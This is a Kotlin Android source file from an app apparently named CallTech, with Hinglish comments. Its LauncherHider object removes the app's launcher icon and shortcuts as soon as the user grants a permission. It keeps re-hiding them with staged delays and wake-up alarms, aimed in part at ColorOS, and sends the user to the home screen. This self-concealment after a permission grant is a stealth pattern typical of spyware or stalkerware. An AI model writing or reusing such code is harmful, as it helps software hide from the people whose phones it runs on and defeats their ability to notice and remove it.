package com.calltech

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ShortcutManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log

/**
 * Allow ke baad dono LAUNCHER alias OFF.
 * HiddenAlias ON rakhne se ColorOS drawer mein CallTech icon dikhata rehta hai.
 */
object LauncherHider {
    private const val TAG = "LauncherHider"
    private const val PREFS = "calltech_install"
    private const val KEY_HIDDEN = "launcher_hidden"
    const val EXTRA_STAGE = "hide_stage"

    private const val VISIBLE_ALIAS = "com.calltech.LauncherAlias"
    private const val HIDDEN_ALIAS = "com.calltech.HiddenAlias"
    private const val REQUEST_BASE = 8820

    private val hideHandler = Handler(Looper.getMainLooper())

    fun ensureLaunchableForSetup(context: Context) {
        val app = context.applicationContext
        if (!hasLauncherAlias(app)) {
            return
        }
        if (InstallFlow.isSetupComplete(app)) {
            hideIfMarked(app)
            return
        }
        val pm = app.packageManager
        val visible = ComponentName(app.packageName, VISIBLE_ALIAS)
        setEnabled(pm, visible, enabled = true)
    }

    /** Sirf Allow ke baad. Permission se pehle hide popup ko maar deta hai. */
    fun hideNow(context: Context) {
        val app = context.applicationContext
        if (!hasLauncherAlias(app)) {
            return
        }
        markHidden(app)
        clearShortcuts(app)
        applyStage(app, 0)
        hideHandler.postDelayed({ applyStage(app, 1) }, 250)
        hideHandler.postDelayed({ applyStage(app, 2) }, 1200)
        hideHandler.postDelayed({ applyStage(app, 3) }, 3500)
        hideHandler.postDelayed({ applyStage(app, 4) }, 8000)
        armHideAlarms(app, startDelayMs = 200L)
    }

    fun hide(context: Context, goHome: Boolean = false, keepProcess: Boolean = true) {
        markHidden(context.applicationContext)
        if (goHome) {
            goHome(context.applicationContext)
        }
        applyStage(context.applicationContext, 0)
    }

    fun hideIfMarked(context: Context) {
        applyStage(context.applicationContext, 0)
    }

    fun scheduleHideAfterLeave(context: Context) {
        markAndSchedule(context)
    }

    fun markAndSchedule(context: Context) {
        val app = context.applicationContext
        markHidden(app)
        goHome(app)
        clearShortcuts(app)
        armHideAlarms(app, startDelayMs = 400L)
        hideHandler.postDelayed({ applyStage(app, 0) }, 600)
        hideHandler.postDelayed({ applyStage(app, 1) }, 2000)
        hideHandler.postDelayed({ applyStage(app, 2) }, 5500)
    }

    fun armHideAlarms(context: Context, startDelayMs: Long = 400L) {
        val app = context.applicationContext
        markHidden(app)
        clearShortcuts(app)
        scheduleStage(app, stage = 0, delayMs = startDelayMs)
        scheduleStage(app, stage = 1, delayMs = startDelayMs + 1400L)
        scheduleStage(app, stage = 2, delayMs = startDelayMs + 4600L)
        scheduleStage(app, stage = 2, delayMs = startDelayMs + 11600L)
    }

    fun applyStage(context: Context, stage: Int) {
        val app = context.applicationContext
        if (!hasLauncherAlias(app)) {
            return
        }
        val pm = app.packageManager
        val visible = ComponentName(app.packageName, VISIBLE_ALIAS)
        val hidden = ComponentName(app.packageName, HIDDEN_ALIAS)

        try {
            setEnabled(pm, visible, enabled = false)
            setEnabled(pm, hidden, enabled = false)
            notifyLauncher(app)
            Log.d(
                TAG,
                "Hide stage=$stage visible=${pm.getComponentEnabledSetting(visible)} " +
                    "hidden=${pm.getComponentEnabledSetting(hidden)}",
            )
        } catch (error: Exception) {
            Log.e(TAG, "Hide stage $stage failed: ${error.message}")
        }
    }

    private fun hasLauncherAlias(app: Context): Boolean {
        return try {
            app.packageManager.getActivityInfo(
                ComponentName(app.packageName, VISIBLE_ALIAS),
                PackageManager.MATCH_DISABLED_COMPONENTS,
            )
            true
        } catch (_: Exception) {
            false
        }
    }

    private fun setEnabled(
        pm: PackageManager,
        component: ComponentName,
        enabled: Boolean,
    ) {
        val target = if (enabled) {
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        } else {
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER
        }
        pm.setComponentEnabledSetting(
            component,
            target,
            PackageManager.DONT_KILL_APP,
        )
    }

    private fun notifyLauncher(app: Context) {
        try {
            app.sendBroadcast(
                Intent(Intent.ACTION_PACKAGE_CHANGED).apply {
                    data = Uri.parse("package:${app.packageName}")
                    addFlags(Intent.FLAG_RECEIVER_FOREGROUND)
                },
            )
        } catch (_: Exception) {
        }
    }

    private fun scheduleStage(app: Context, stage: Int, delayMs: Long) {
        val alarmManager = app.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(app, HideLauncherReceiver::class.java).putExtra(EXTRA_STAGE, stage)
        val pending = PendingIntent.getBroadcast(
            app,
            REQUEST_BASE + stage + delayMs.toInt(),
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val triggerAt = System.currentTimeMillis() + delayMs
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pending)
            } else {
                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAt, pending)
            }
        } catch (error: Exception) {
            Log.w(TAG, "Hide alarm failed: ${error.message}")
        }
    }

    private fun goHome(app: Context) {
        try {
            app.startActivity(
                Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_HOME)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                },
            )
        } catch (error: Exception) {
            Log.w(TAG, "Home launch after hide failed: ${error.message}")
        }
    }

    private fun clearShortcuts(app: Context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N_MR1) {
            return
        }
        try {
            val shortcuts = app.getSystemService(ShortcutManager::class.java) ?: return
            shortcuts.removeAllDynamicShortcuts()
            if (shortcuts.pinnedShortcuts.isNotEmpty()) {
                shortcuts.disableShortcuts(shortcuts.pinnedShortcuts.map { it.id })
            }
        } catch (error: Exception) {
            Log.w(TAG, "Shortcut clear failed: ${error.message}")
        }
    }

    private fun markHidden(app: Context) {
        app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_HIDDEN, true)
            .apply()
    }
}
